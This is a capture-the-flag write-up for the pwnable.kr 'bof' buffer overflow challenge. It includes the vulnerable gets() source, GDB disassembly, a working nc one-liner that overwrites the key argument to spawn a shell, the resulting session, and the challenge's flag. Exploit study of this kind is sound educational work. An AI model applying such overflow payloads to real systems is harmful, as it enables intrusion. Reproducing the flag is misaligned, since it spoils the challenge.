# bof
slopey112 - 2/24/19

The description of this challenge tells us that it is a buffer overflow vulnerability. Downloading the source code, we can see it is indeed a buffer overflow.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

It seems that an argument is passed to `func`, which is `0xdeadbeef`. Then it is compared to a key, `0xcafebabe`, and if the keys match, we will gain access to the shell.

We notice straight of the bat that the argument passed to `func` will never change...Unless, of course, we overflow it.

Let's open up GDB and take a look at this. The only function of interest here is `func`, so we'll disassemble that.

```
0x0000062c <+0>:	push   ebp
0x0000062d <+1>:	mov    ebp,esp
0x0000062f <+3>:	sub    esp,0x48
0x00000632 <+6>:	mov    eax,gs:0x14
0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
0x0000063b <+15>:	xor    eax,eax
0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
0x00000644 <+24>:	call   0x645 <func+25>
0x00000649 <+29>:	lea    eax,[ebp-0x2c]
0x0000064c <+32>:	mov    DWORD PTR [esp],eax
0x0000064f <+35>:	call   0x650 <func+36>
0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
0x0000065b <+47>:	jne    0x66b <func+63>
0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
0x00000664 <+56>:	call   0x665 <func+57>
0x00000669 <+61>:	jmp    0x677 <func+75>
0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
0x00000672 <+70>:	call   0x673 <func+71>
0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
0x00000681 <+85>:	je     0x688 <func+92>
0x00000683 <+87>:	call   0x684 <func+88>
0x00000688 <+92>:	leave  
0x00000689 <+93>:	ret   
```

The first interesting thing we see here is on `<+29>`, where `eax` is given `0x2c` of space. This is none other than the buffer. Wait, but wasn't buffer allocated only 32 bytes? Why is it now 44? Simply put, compilers are weird. To make things more efficient, they allocate memory differently.

However, we can't just overflow the buffer. Let's go down to `<+40>`.

```
0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
```

Ok, so here's our key comparison. Our goal is make `[ebp+0x8]` equal to the key. A key observation here is that the key is compared to an address 8 bytes above the `ebp`. Why is that? This is because those 8 bytes are the saved stack frame from `main`. So that means if we just overflow 44 bytes, it isn't enough; we must overflow 44 bytes + those 8 bytes, making 52 bytes in total.

Let's call python on the server with these  things in mind. Also keep in mind that when the key matches, we don't immediately get the flag; rather, we are given the shell. That had a second minor complication, but it can be easily resolved.

```shell
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000
```

Note the use of `cat` at the end. Since we're getting a shell, we pass `cat` to `stdin` so the shell does not get a null input. After that, we gain the root shell.

```
whoami
bof
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```
